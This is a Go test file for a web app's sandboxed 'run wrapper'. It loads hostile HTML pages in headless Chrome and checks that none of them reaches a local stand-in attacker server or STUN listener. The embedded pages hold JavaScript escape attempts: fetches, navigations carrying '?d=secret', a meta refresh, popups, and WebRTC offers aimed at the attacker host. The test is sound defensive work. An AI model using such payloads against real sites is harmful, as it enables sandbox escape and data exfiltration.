package web_test

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	"yardr.dev/yardr/internal/store"
	"yardr.dev/yardr/internal/storetest"
	"yardr.dev/yardr/internal/web"
)

// The run wrapper confines a hostile page in a real browser: its
// scripts run, and nothing leaves. Headless Chrome opens the wrapper
// around a page that tries every way out — top navigation by script,
// self navigation by script and by meta refresh, fetch, workers,
// frames, popups, cookies, storage, and a WebRTC peer connection —
// and the test holds that none of it reaches the attacker or the
// STUN stand-in, while the page's own signals prove its scripts ran
// and stayed in place. A machine with no Chrome skips it; the header
// tests prove the policy on every machine.
func TestRunInBrowser(t *testing.T) {
	chrome := findChrome()
	if chrome == "" {
		t.Skip("no headless Chrome: looked for SHOT_CHROME, google-chrome, google-chrome-stable, chromium, chromium-browser and the macOS application")
	}
	b := newBrowserFixture(t)

	evil := `<!DOCTYPE html><html><head><title>evil</title></head><body><script>
function sig(s){try{var f=document.createElement('iframe');f.src='/ping/'+s;document.body.appendChild(f);}catch(e){}}
sig('ran');
try{fetch('ATK/fetch').then(function(){sig('fetch-ALLOWED')},function(){sig('fetch-blocked')});}catch(e){sig('fetch-threw')}
try{new Worker('/ping/worker-src');sig('worker-ALLOWED');}catch(e){sig('worker-blocked')}
try{var w=window.open('ATK/popup','_blank');sig(w?'popup-ALLOWED':'popup-null');}catch(e){sig('popup-threw')}
try{sig(typeof RTCPeerConnection==='undefined'?'rtc-absent':'rtc-PRESENT');}catch(e){sig('rtc-threw')}
try{var pc=new RTCPeerConnection({iceServers:[{urls:['stun:127.0.0.1:UDPPORT']}]});pc.createDataChannel('x');pc.createOffer().then(function(o){return pc.setLocalDescription(o);}).then(function(){sig('rtc-offer-ok')},function(){sig('rtc-offer-failed')});}catch(e){sig('rtc-threw')}
try{document.cookie='p=1';sig(document.cookie?'cookie-ALLOWED':'cookie-unset');}catch(e){sig('cookie-threw')}
try{localStorage.setItem('p','1');sig('storage-ALLOWED');}catch(e){sig('storage-blocked')}
try{window.top.location='ATK/topnav?d=secret';}catch(e){sig('topnav-threw')}
try{location.href='ATK/selfnav?d=secret';}catch(e){sig('selfnav-threw')}
sig('done');
</script></body></html>`
	evil = strings.ReplaceAll(evil, "ATK", b.attacker.URL)
	evil = strings.ReplaceAll(evil, "UDPPORT", fmt.Sprint(b.udpPort))
	page := b.notedPage(t, []byte(evil))

	dom := b.dump(t, chrome, b.sandbox.URL+"/run/"+page.Hash)
	if !strings.Contains(dom, "<title>run ") {
		t.Errorf("the dumped page is not the run wrapper: %.200q", dom)
	}
	if strings.Contains(dom, "ATTACKER") {
		t.Error("the top page navigated to the attacker")
	}
	// The signals prove the page's scripts ran to their end; the
	// attacker and STUN logs below prove none of it left.
	b.wantSignals(t, []string{"ran", "worker-blocked", "rtc-absent", "rtc-threw", "storage-blocked", "done"})
	b.wantNoSignals(t, []string{"fetch-ALLOWED", "worker-ALLOWED", "popup-ALLOWED", "rtc-PRESENT", "rtc-offer-ok", "rtc-offer-failed", "cookie-ALLOWED", "storage-ALLOWED"})
	// A refusal that throws in one browser silently fails in
	// another; either is blocked.
	b.wantAnySignal(t, "fetch-blocked", "fetch-threw")
	b.wantAnySignal(t, "popup-null", "popup-threw")
	b.wantAnySignal(t, "cookie-threw", "cookie-unset")

	// A meta refresh to the attacker dies the same way: the frame
	// stays, and its scripts still run.
	meta := `<!DOCTYPE html><html><head><title>evil</title><meta http-equiv="refresh" content="1; url=ATK/metahit?d=secret"></head><body><script>
function sig(s){try{var f=document.createElement('iframe');f.src='/ping/'+s;document.body.appendChild(f);}catch(e){}}
sig('meta-ran');
</script></body></html>`
	meta = strings.ReplaceAll(meta, "ATK", b.attacker.URL)
	ref := b.notedPage(t, []byte(meta))
	dom = b.dump(t, chrome, b.sandbox.URL+"/run/"+ref.Hash)
	if !strings.Contains(dom, "<title>run ") {
		t.Errorf("the dumped meta page is not the run wrapper: %.200q", dom)
	}
	if strings.Contains(dom, "ATTACKER") {
		t.Error("the meta page navigated to the attacker")
	}
	b.wantSignals(t, []string{"meta-ran"})

	if hits := b.attackerHits(); len(hits) != 0 {
		t.Errorf("the attacker was reached: %q", hits)
	}
	// STUN retransmits for a while; a peer connection the page opened
	// would have knocked by now.
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) && b.udpCount() == 0 {
		time.Sleep(100 * time.Millisecond)
	}
	if n := b.udpCount(); n != 0 {
		t.Errorf("the STUN stand-in was reached %d times", n)
	}
}

// findChrome is the headless Chrome to probe with: SHOT_CHROME where
// that names an executable, else the first of the names on PATH,
// else the macOS application, as contrib/shot/shot finds it. ""
// when there is none.
func findChrome() string {
	if bin := os.Getenv("SHOT_CHROME"); bin != "" {
		if st, err := os.Stat(bin); err == nil && !st.IsDir() && st.Mode()&0o111 != 0 {
			return bin
		}
		return ""
	}
	for _, c := range []string{"google-chrome", "google-chrome-stable", "chromium", "chromium-browser"} {
		if p, err := exec.LookPath(c); err == nil {
			return p
		}
	}
	if runtime.GOOS == "darwin" {
		app := "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
		if st, err := os.Stat(app); err == nil && !st.IsDir() && st.Mode()&0o111 != 0 {
			return app
		}
	}
	return ""
}

// browserFixture serves the sandbox origin with a signal route beside
// it, an attacker origin on another port, and a UDP stand-in for a
// STUN server, all on loopback.
type browserFixture struct {
	t        *testing.T
	st       store.API
	srv      *web.Server
	sandbox  *httptest.Server
	attacker *httptest.Server
	mu       sync.Mutex
	pings    map[string]bool
	hits     []string
	udp      *net.UDPConn
	udpPort  int
	udpHits  int
}

func newBrowserFixture(t *testing.T) *browserFixture {
	t.Helper()
	dir := t.TempDir()
	st := storetest.Open(t, filepath.Join(dir, "yard.db"))
	srv, err := web.NewServer(st, dir, nil)
	if err != nil {
		t.Fatal(err)
	}
	b := &browserFixture{t: t, st: st, srv: srv, pings: map[string]bool{}}
	mux := http.NewServeMux()
	mux.HandleFunc("/ping/{label}", func(w http.ResponseWriter, r *http.Request) {
		b.mu.Lock()
		b.pings[r.PathValue("label")] = true
		b.mu.Unlock()
		w.WriteHeader(http.StatusNoContent)
	})
	mux.HandleFunc("/", srv.PagesHandler().ServeHTTP)
	b.sandbox = httptest.NewServer(mux)
	t.Cleanup(b.sandbox.Close)
	b.attacker = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b.mu.Lock()
		b.hits = append(b.hits, r.URL.Path+"?"+r.URL.RawQuery)
		b.mu.Unlock()
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte("<!DOCTYPE html><html><head><title>ATTACKER</title></head><body>attacker</body></html>"))
	}))
	t.Cleanup(b.attacker.Close)
	addr, err := net.ResolveUDPAddr("udp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	if b.udp, err = net.ListenUDP("udp", addr); err != nil {
		t.Fatal(err)
	}
	b.udpPort = b.udp.LocalAddr().(*net.UDPAddr).Port
	t.Cleanup(func() { _ = b.udp.Close() })
	go func() {
		var buf [1500]byte
		for {
			if _, _, err := b.udp.ReadFromUDP(buf[:]); err != nil {
				return
			}
			b.mu.Lock()
			b.udpHits++
			b.mu.Unlock()
		}
	}()
	return b
}

// notedPage puts bytes as a page on a note of a new bead.
func (b *browserFixture) notedPage(t *testing.T, bytes []byte) *store.BlobRef {
	t.Helper()
	ctx := context.Background()
	bead, err := b.st.CreateBead(ctx, store.NewBead{Title: "a door"}, "me")
	if err != nil {
		t.Fatal(err)
	}
	ref, err := b.st.PutBlob(ctx, bytes)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := b.st.AddNotedAs(ctx, bead.ID, "the door, hung", "me", "", ref.Hash); err != nil {
		t.Fatal(err)
	}
	return ref
}

// dump opens url in a throwaway headless Chrome and returns the
// top page as it stands after its scripts ran.
func (b *browserFixture) dump(t *testing.T, chrome, url string) string {
	t.Helper()
	prof := t.TempDir()
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()
	cmd := exec.CommandContext(ctx, chrome, "--headless", "--disable-gpu", "--no-first-run",
		"--user-data-dir="+prof, "--virtual-time-budget=8000", "--dump-dom", url)
	out, err := cmd.Output()
	if err != nil {
		t.Fatalf("Chrome dumped nothing for %s: %v", url, err)
	}
	return string(out)
}

// wantSignals holds that every label arrived from the page: each is
// a nested frame's fetch of the signal route, which only the page's
// own scripts could have asked for.
func (b *browserFixture) wantSignals(t *testing.T, labels []string) {
	t.Helper()
	deadline := time.Now().Add(30 * time.Second)
	for {
		b.mu.Lock()
		var missing []string
		for _, l := range labels {
			if !b.pings[l] {
				missing = append(missing, l)
			}
		}
		b.mu.Unlock()
		if len(missing) == 0 {
			return
		}
		if time.Now().After(deadline) {
			t.Fatalf("the page never signalled %q (have %q)", missing, b.pingList())
		}
		time.Sleep(100 * time.Millisecond)
	}
}

// wantAnySignal holds that at least one of the labels arrived.
func (b *browserFixture) wantAnySignal(t *testing.T, labels ...string) {
	t.Helper()
	b.mu.Lock()
	defer b.mu.Unlock()
	for _, l := range labels {
		if b.pings[l] {
			return
		}
	}
	t.Errorf("the page signalled none of %q", labels)
}

func (b *browserFixture) wantNoSignals(t *testing.T, labels []string) {
	t.Helper()
	b.mu.Lock()
	defer b.mu.Unlock()
	for _, l := range labels {
		if b.pings[l] {
			t.Errorf("the page signalled %q", l)
		}
	}
}

func (b *browserFixture) pingList() []string {
	b.mu.Lock()
	defer b.mu.Unlock()
	var out []string
	for l := range b.pings {
		out = append(out, l)
	}
	return out
}

func (b *browserFixture) attackerHits() []string {
	b.mu.Lock()
	defer b.mu.Unlock()
	return append([]string{}, b.hits...)
}

func (b *browserFixture) udpCount() int {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.udpHits
}
